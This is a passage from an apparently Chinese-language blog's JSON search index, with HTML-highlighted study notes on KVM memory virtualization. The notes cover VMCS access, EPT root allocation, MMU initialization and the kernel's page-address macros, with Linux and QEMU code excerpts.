class=\"line\"></span><br><span class=\"line\">    host_addr = (<span class=\"type\">void</span> *)((<span class=\"type\">uintptr_t</span>)addr &amp; ~(rb_page_size - <span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* When a page is deflated, we hint the whole host page it lives</span></span><br><span class=\"line\"><span class=\"comment\">     * on, since we can&#x27;t do anything smaller */</span></span><br><span class=\"line\">    ret = qemu_madvise(host_addr, rb_page_size, QEMU_MADV_WILLNEED);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ret != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        warn_report(<span class=\"string\">&quot;Couldn&#x27;t MADV_WILLNEED on balloon deflate: %s&quot;</span>,</span><br><span class=\"line\">                    strerror(errno));</span><br><span class=\"line\">        <span class=\"comment\">/* Otherwise ignore, failing to page hint shouldn&#x27;t be fatal */</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>wait_event在include&#x2F;linux&#x2F;wait.h</p>\n<p>___wait_event</p>\n","categories":["virtualization"]},{"title":"kvm 内存","url":"/2024/01/18/virtualization/kvm%20%E5%86%85%E5%AD%98/","content":"<h1 id=\"kvm-内存\"><a href=\"#kvm-内存\" class=\"headerlink\" title=\"kvm 内存\"></a>kvm 内存</h1><p><a href=\"https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3c-part-3-manual.pdf\">intel.com&#x2F;content&#x2F;dam&#x2F;www&#x2F;public&#x2F;us&#x2F;en&#x2F;documents&#x2F;manuals&#x2F;64-ia-32-architectures-software-developer-vol-3c-part-3-manual.pdf</a></p>\n<ul>\n<li>guest自己配置的页表完成GVA-&gt;GPA翻译 kvm不管这个数据结构</li>\n<li>kvm的memslot完成GPA-&gt;HVA翻译 kvm维护这个数据结构，参数由用户态(qemu)提供</li>\n<li>kvm的EPT(spt)完成GPA-&gt;HPA翻译，完全由kvm分配维护。需要结合memslot与自己进程的页表构造EPT</li>\n<li>内核模块完成HVA-&gt;HPA翻译，涉及到VMA、页表等数据结构，在kvm需要的时候提供查询</li>\n</ul>\n<h2 id=\"VMCS\"><a href=\"#VMCS\" class=\"headerlink\" title=\"VMCS\"></a>VMCS</h2><p>一个vcpu对应一个VMCS，包括一套寄存器和一个虚拟MMU等。</p>\n<p><code>kvm_vm_ioctl_create_vcpu</code>会设置对应的虚拟mmu信息</p>\n<p>通过硬件提供的扩展指令设置当前的VMCS并且读写VMCS的域</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">vmcs_load</span><span class=\"params\">(<span class=\"keyword\">struct</span> vmcs *vmcs)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tu64 phys_addr = __pa(vmcs);</span><br><span class=\"line\">\tu8 error;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(__ex(ASM_VMX_VMPTRLD_RAX) <span class=\"string\">&quot;; setna %0&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t\t: <span class=\"string\">&quot;=qm&quot;</span>(error) : <span class=\"string\">&quot;a&quot;</span>(&amp;phys_addr), <span class=\"string\">&quot;m&quot;</span>(phys_addr)</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t: <span class=\"string\">&quot;cc&quot;</span>, <span class=\"string\">&quot;memory&quot;</span>)</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (error)</span><br><span class=\"line\">\t\tprintk(KERN_ERR <span class=\"string\">&quot;kvm: vmptrld %p/%llx failed\\n&quot;</span>,</span><br><span class=\"line\">\t\t       vmcs, phys_addr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> __always_inline <span class=\"type\">void</span> __vmcs_writel(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> field, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> value)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tu8 error;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">asm</span> <span class=\"title function_\">volatile</span> <span class=\"params\">(__ex(ASM_VMX_VMWRITE_RAX_RDX) <span class=\"string\">&quot;; setna %0&quot;</span></span></span><br><span class=\"line\"><span class=\"params\">\t\t       : <span class=\"string\">&quot;=q&quot;</span>(error) : <span class=\"string\">&quot;a&quot;</span>(value), <span class=\"string\">&quot;d&quot;</span>(field) : <span class=\"string\">&quot;cc&quot;</span>)</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(error))</span><br><span class=\"line\">\t\tvmwrite_error(field, value);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span> <span class=\"title\">vmcs_field</span> &#123;</span></span><br><span class=\"line\">\t...</span><br><span class=\"line\">\tHOST_RSP                        = <span class=\"number\">0x00006c14</span>,</span><br><span class=\"line\">\tHOST_RIP                        = <span class=\"number\">0x00006c16</span>,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<p>field赋值给rdx，value赋值给rax，随后此条汇编指令执行<code>vmcs[%rdx]=%rax</code></p>\n<h2 id=\"启动与配置\"><a href=\"#启动与配置\" class=\"headerlink\" title=\"启动与配置\"></a>启动与配置</h2><h3 id=\"module-init\"><a href=\"#module-init\" class=\"headerlink\" title=\"module init\"></a>module init</h3><p>加载module时会根据arch进行相关的硬件初始化，并直接在硬件允许的情况下打开EPT的设置</p>\n<p>(module_init)<code>vmx_init</code>-&gt;<code>kvm_init</code>-&gt;<code>kvm_arch_hardware_setup</code>-&gt;<code>hardware_setup</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> __read_mostly enable_ept = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"type\">static</span> __init <span class=\"type\">int</span> <span class=\"title function_\">hardware_setup</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!cpu_has_vmx_ept() ||</span><br><span class=\"line\">\t    !cpu_has_vmx_ept_4levels() ||</span><br><span class=\"line\">\t    !cpu_has_vmx_ept_mt_wb() ||</span><br><span class=\"line\">\t    !cpu_has_vmx_invept_global())</span><br><span class=\"line\">\t\tenable_ept = <span class=\"number\">0</span>;</span><br><span class=\"line\">    \t<span class=\"keyword\">if</span> (enable_ept)</span><br><span class=\"line\">\t\t\tvmx_enable_tdp();</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\tkvm_disable_tdp();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>vmx_enable_tdp</code>-&gt;<code>kvm_enable_tdp</code></p>\n<h3 id=\"create\"><a href=\"#create\" class=\"headerlink\" title=\"create\"></a>create</h3><h4 id=\"cr3\"><a href=\"#cr3\" class=\"headerlink\" title=\"cr3\"></a>cr3</h4><p>用户态可以设置sreg 指定cr3的值</p>\n<p>[q]这里用户态(例如qemu)配置cr3的值是否可有可无？操作系统启动不都是会自己配置页表和cr3吗</p>\n<p>操作系统(如chcore)会在打开mmu之前先进行页表配置，如何兼容这样的操作系统？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_arch_vcpu_ioctl_set_sregs</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t  <span class=\"keyword\">struct</span> kvm_sregs *sregs)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">\tvcpu-&gt;arch.cr3 = sregs-&gt;cr3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>以kvm-hello-world为例</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">vm-&gt;mem = mmap(<span class=\"literal\">NULL</span>, mem_size, PROT_READ | PROT_WRITE,</span><br><span class=\"line\">\t\t   MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">memreg.guest_phys_addr = <span class=\"number\">0</span>;</span><br><span class=\"line\">memreg.memory_size = <span class=\"number\">0x200000</span>;</span><br><span class=\"line\">memreg.userspace_addr = (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)vm-&gt;mem;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">uint64_t</span> pml4_addr = <span class=\"number\">0x2000</span>;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *pml4 = (<span class=\"type\">void</span> *)(vm-&gt;mem + pml4_addr);</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> pdpt_addr = <span class=\"number\">0x3000</span>;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *pdpt = (<span class=\"type\">void</span> *)(vm-&gt;mem + pdpt_addr);</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> pd_addr = <span class=\"number\">0x4000</span>;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> *pd = (<span class=\"type\">void</span> *)(vm-&gt;mem + pd_addr);</span><br><span class=\"line\">pml4[<span class=\"number\">0</span>] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pdpt_addr;</span><br><span class=\"line\">pdpt[<span class=\"number\">0</span>] = PDE64_PRESENT | PDE64_RW | PDE64_USER | pd_addr;</span><br><span class=\"line\">pd[<span class=\"number\">0</span>] = PDE64_PRESENT | PDE64_RW | PDE64_USER | PDE64_PS;</span><br><span class=\"line\"></span><br><span class=\"line\">sregs-&gt;cr3 = pml4_addr;</span><br></pre></td></tr></table></figure>\n\n<p>这是存储的是GPA，但是修改的是HVA。当进行地址翻译时，第一阶段页表存储的GPA本身就会被EPT翻译到HPA（或者GPA-&gt;HVA，再通过EPT Violation建立GPA-&gt;HPA）</p>\n<p>这里每个index都是0，且最后一级PTE没有地址，所以做的是0x0-&gt;0x0的地址映射，GPA&#x3D;GVA</p>\n<h4 id=\"mmu\"><a href=\"#mmu\" class=\"headerlink\" title=\"mmu\"></a>mmu</h4><p>用户态ioctl创建vcpu时，进行虚拟mmu初始化</p>\n<p><code>kvm_vm_ioctl</code>-&gt;<code>kvm_vm_ioctl_create_vcpu</code>-&gt;<code>kvm_arch_vcpu_setup</code>-&gt;<code>kvm_mmu_setup</code>-&gt;<code>init_kvm_mmu</code>-&gt;<code>init_kvm_tdp_mmu</code></p>\n<p>这里的配置是看后续函数调用和函数内部分支的依据</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">init_kvm_mmu</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tdp_enabled)</span><br><span class=\"line\">\t\tinit_kvm_tdp_mmu(vcpu);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">init_kvm_tdp_mmu</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu</span> *<span class=\"title\">context</span> =</span> &amp;vcpu-&gt;arch.mmu;</span><br><span class=\"line\"></span><br><span class=\"line\">\tcontext-&gt;base_role.word = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tcontext-&gt;base_role.smm = is_smm(vcpu);</span><br><span class=\"line\">\tcontext-&gt;base_role.ad_disabled = (shadow_accessed_mask == <span class=\"number\">0</span>);</span><br><span class=\"line\">\tcontext-&gt;page_fault = tdp_page_fault;</span><br><span class=\"line\">\tcontext-&gt;sync_page = nonpaging_sync_page;</span><br><span class=\"line\">\tcontext-&gt;invlpg = nonpaging_invlpg;</span><br><span class=\"line\">\tcontext-&gt;update_pte = nonpaging_update_pte;</span><br><span class=\"line\">\tcontext-&gt;shadow_root_level = kvm_x86_ops-&gt;get_tdp_level(vcpu);</span><br><span class=\"line\">\tcontext-&gt;root_hpa = INVALID_PAGE;</span><br><span class=\"line\">\tcontext-&gt;direct_map = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\tcontext-&gt;set_cr3 = kvm_x86_ops-&gt;set_tdp_cr3;</span><br><span class=\"line\">\tcontext-&gt;get_cr3 = get_cr3;</span><br><span class=\"line\">\tcontext-&gt;get_pdptr = kvm_pdptr_read;</span><br><span class=\"line\">\tcontext-&gt;inject_page_fault = kvm_inject_page_fault;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!is_paging(vcpu)) &#123;</span><br><span class=\"line\">\t\tcontext-&gt;nx = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tcontext-&gt;gva_to_gpa = nonpaging_gva_to_gpa;</span><br><span class=\"line\">\t\tcontext-&gt;root_level = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_long_mode(vcpu)) &#123;</span><br><span class=\"line\">\t\tcontext-&gt;nx = is_nx(vcpu);</span><br><span class=\"line\">\t\tcontext-&gt;root_level = is_la57_mode(vcpu) ?</span><br><span class=\"line\">\t\t\t\tPT64_ROOT_5LEVEL : PT64_ROOT_4LEVEL;</span><br><span class=\"line\">\t\treset_rsvds_bits_mask(vcpu, context);</span><br><span class=\"line\">\t\tcontext-&gt;gva_to_gpa = paging64_gva_to_gpa;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_pae(vcpu)) &#123;</span><br><span class=\"line\">\t\tcontext-&gt;nx = is_nx(vcpu);</span><br><span class=\"line\">\t\tcontext-&gt;root_level = PT32E_ROOT_LEVEL;</span><br><span class=\"line\">\t\treset_rsvds_bits_mask(vcpu, context);</span><br><span class=\"line\">\t\tcontext-&gt;gva_to_gpa = paging64_gva_to_gpa;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tcontext-&gt;nx = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t\tcontext-&gt;root_level = PT32_ROOT_LEVEL;</span><br><span class=\"line\">\t\treset_rsvds_bits_mask(vcpu, context);</span><br><span class=\"line\">\t\tcontext-&gt;gva_to_gpa = paging32_gva_to_gpa;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tupdate_permission_bitmask(vcpu, context, <span class=\"literal\">false</span>);</span><br><span class=\"line\">\tupdate_pkru_bitmask(vcpu, context, <span class=\"literal\">false</span>);</span><br><span class=\"line\">\tupdate_last_nonleaf_level(vcpu, context);</span><br><span class=\"line\">\treset_tdp_shadow_zero_bits_mask(vcpu, context);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"run\"><a href=\"#run\" class=\"headerlink\" title=\"run\"></a>run</h3><p>每次run之前都会reload mmu</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    r = kvm_mmu_reload(vcpu);</span><br><span class=\"line\">    kvm_x86_ops-&gt;run(vcpu);</span><br><span class=\"line\">    r = kvm_x86_ops-&gt;handle_exit(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>kvm_mmu_reload</code>-&gt;<code>kvm_mmu_load</code>-&gt;<code>mmu_alloc_roots</code>-&gt;<code>mmu_alloc_direct_roots</code></p>\n<h4 id=\"EPT\"><a href=\"#EPT\" class=\"headerlink\" title=\"EPT\"></a>EPT</h4><p>spt是shadow page table 虽然命名是影子页表，但实际上是EPT复用了这个数据结构。</p>\n<p><a href=\"https://blog.csdn.net/huang987246510/article/details/105645656/\">内存虚拟化软件基础——KVM SPT_spt和ept_享乐主的博客-CSDN博客</a></p>\n<p><img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230703194155548.png\" alt=\"image-20230703194155548\"></p>\n<p>这里page table page不是只记录一个基地址然后用指针连接，而是每个page都会对应一个<code>kvm_mmu_page</code>结构体，spt成员变量为真实的page table page</p>\n<p>这里root_hpa是EPT的基地址（HPA）</p>\n<h5 id=\"构造流程\"><a href=\"#构造流程\" class=\"headerlink\" title=\"构造流程\"></a>构造流程</h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_mmu_load</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tr = mmu_alloc_roots(vcpu);</span><br><span class=\"line\">\tvcpu-&gt;arch.mmu.set_cr3(vcpu, vcpu-&gt;arch.mmu.root_hpa);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">mmu_alloc_direct_roots</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vcpu-&gt;arch.mmu.shadow_root_level &gt;= PT64_ROOT_4LEVEL) &#123;</span><br><span class=\"line\">\t\tspin_lock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(make_mmu_pages_available(vcpu) &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\tspin_unlock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> -ENOSPC;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tsp = kvm_mmu_get_page(vcpu, <span class=\"number\">0</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t\t\tvcpu-&gt;arch.mmu.shadow_root_level, <span class=\"number\">1</span>, ACC_ALL);</span><br><span class=\"line\">\t\t++sp-&gt;root_count;</span><br><span class=\"line\">\t\tspin_unlock(&amp;vcpu-&gt;kvm-&gt;mmu_lock);</span><br><span class=\"line\">\t\tvcpu-&gt;arch.mmu.root_hpa = __pa(sp-&gt;spt);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> kvm_mmu_page *<span class=\"title function_\">kvm_mmu_get_page</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t<span class=\"type\">gfn_t</span> gfn,<span class=\"type\">gva_t</span> gaddr,<span class=\"type\">unsigned</span> level,<span class=\"type\">int</span> direct, <span class=\"type\">unsigned</span> access)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span> <span class=\"title\">kvm_mmu_page_role</span> <span class=\"title\">role</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> quadrant;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">bool</span> need_sync = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> flush = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> collisions = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tLIST_HEAD(invalid_list);</span><br><span class=\"line\"></span><br><span class=\"line\">\trole = vcpu-&gt;arch.mmu.base_role;</span><br><span class=\"line\">\trole.level = level;</span><br><span class=\"line\">\trole.direct = direct;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (role.direct)</span><br><span class=\"line\">\t\trole.cr4_pae = <span class=\"number\">0</span>;</span><br><span class=\"line\">\trole.access = access;</span><br><span class=\"line\">\tfor_each_valid_sp(vcpu-&gt;kvm, sp, gfn) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (sp-&gt;gfn != gfn) &#123;</span><br><span class=\"line\">\t\t\tcollisions++;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!need_sync &amp;&amp; sp-&gt;unsync)</span><br><span class=\"line\">\t\t\tneed_sync = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (sp-&gt;role.word != role.word)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t++vcpu-&gt;kvm-&gt;stat.mmu_cache_miss;</span><br><span class=\"line\">\tsp = kvm_mmu_alloc_page(vcpu, direct);</span><br><span class=\"line\">\tsp-&gt;gfn = gfn;</span><br><span class=\"line\">\tsp-&gt;role = role;</span><br><span class=\"line\">\thlist_add_head(&amp;sp-&gt;hash_link,</span><br><span class=\"line\">\t\t&amp;vcpu-&gt;kvm-&gt;arch.mmu_page_hash[kvm_page_table_hashfn(gfn)]);</span><br><span class=\"line\">\tsp-&gt;mmu_valid_gen = vcpu-&gt;kvm-&gt;arch.mmu_valid_gen;</span><br><span class=\"line\">\tclear_page(sp-&gt;spt);</span><br><span class=\"line\">\tkvm_mmu_flush_or_zap(vcpu, &amp;invalid_list, <span class=\"literal\">false</span>, flush);</span><br><span class=\"line\">out:</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> kvm_mmu_page *<span class=\"title function_\">kvm_mmu_alloc_page</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">int</span> direct)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm_mmu_page</span> *<span class=\"title\">sp</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tsp = mmu_memory_cache_alloc(&amp;vcpu-&gt;arch.mmu_page_header_cache);</span><br><span class=\"line\">\tsp-&gt;spt = mmu_memory_cache_alloc(&amp;vcpu-&gt;arch.mmu_page_cache);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!direct)</span><br><span class=\"line\">\t\tsp-&gt;gfns = mmu_memory_cache_alloc(&amp;vcpu-&gt;arch.mmu_page_cache);</span><br><span class=\"line\">\tset_page_private(virt_to_page(sp-&gt;spt), (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)sp);</span><br><span class=\"line\">\tlist_add(&amp;sp-&gt;link, &amp;vcpu-&gt;kvm-&gt;arch.active_mmu_pages);</span><br><span class=\"line\">\tkvm_mod_used_mmu_pages(vcpu-&gt;kvm, +<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> sp;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这里<code>kvm_mmu_get_page</code>是后续缺页异常添加页表页也会复用到的函数，作用就是返回(不存在时分配)page这个数据结构，不涉及页表页间的连接（配置页表项）</p>\n<p><code>kvm_mmu_page</code> 用hash table维护，这样可以直接找到某个地址对应的页表页，不需要遍历4级页表。</p>\n<p>这里root给的gfn是0，即GPA是0。初始化只有第一级页表页且不存在任何页表项。</p>\n<p>这里虽然每次run都会get_page，但是只有第一次会真的alloc，其他时候都会直接返回第一级页表页。</p>\n<p>在第一次run时，kvm不会先根据memslot创建好所有的映射，而是等guest真的访问了再在ept violation中加入对应的页表项。（刚运行时，VM的代码段需要被读取并执行，触发大量ept violation；写内存操作又会触发ept violation）</p>\n<p><code>kvm_mmu_flush_or_zap</code>会在一定条件下flush tlb，但是这里的条件都被给了false(linux6.4版本在这里没有flush tlb)</p>\n<h5 id=\"页表页的获取\"><a href=\"#页表页的获取\" class=\"headerlink\" title=\"页表页的获取\"></a>页表页的获取</h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> *<span class=\"title function_\">mmu_memory_cache_alloc</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_mmu_memory_cache *mc)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *p;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBUG_ON(!mc-&gt;nobjs);</span><br><span class=\"line\">\tp = mc-&gt;objects[--mc-&gt;nobjs];</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">mmu_topup_memory_cache_page</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_mmu_memory_cache *cache,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t       <span class=\"type\">int</span> min)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *page;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (cache-&gt;nobjs &gt;= min)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (cache-&gt;nobjs &lt; ARRAY_SIZE(cache-&gt;objects)) &#123;</span><br><span class=\"line\">\t\tpage = (<span class=\"type\">void</span> *)__get_free_page(GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!page)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> -ENOMEM;</span><br><span class=\"line\">\t\tcache-&gt;objects[cache-&gt;nobjs++] = page;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>拿page最后会调<code>mm/page_alloc.c</code>的<code>__alloc_pages_nodemask</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//include/linux/mm.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> page_address(page) lowmem_page_address(page)</span></span><br><span class=\"line\"><span class=\"type\">static</span> __always_inline <span class=\"type\">void</span> *<span class=\"title function_\">lowmem_page_address</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"keyword\">struct</span> page *page)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> page_to_virt(page);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> page_to_virt(x)\t__va(PFN_PHYS(page_to_pfn(x)))</span></span><br><span class=\"line\"><span class=\"comment\">//arch/x86/include/asm</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __pa(x)\t\t__phys_addr((unsigned long)(x))</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __va(x)\t\t\t((void *)((unsigned long)(x)+PAGE_OFFSET))</span></span><br><span class=\"line\"><span class=\"comment\">//include/linux/pfn.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PFN_PHYS(x)\t((phys_addr_t)(x) &lt;&lt; PAGE_SHIFT)</span></span><br><span class=\"line\"><span class=\"comment\">//arch/x86/mm/physaddr.c</span></span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">long</span> __phys_addr(<span class=\"type\">unsigned</span> <span class=\"type\">long</span> x)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> y = x - __START_KERNEL_map;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (unlikely(x &gt; y)) &#123;</span><br><span class=\"line\">\t\tx = y + phys_base;</span><br><span class=\"line\">\t\tVIRTUAL_BUG_ON(y &gt;= KERNEL_IMAGE_SIZE);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\tx = y + (__START_KERNEL_map - PAGE_OFFSET);</span><br><span class=\"line\">\t\tVIRTUAL_BUG_ON((x &gt; y) || !phys_addr_valid(x));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x;</span><br><span 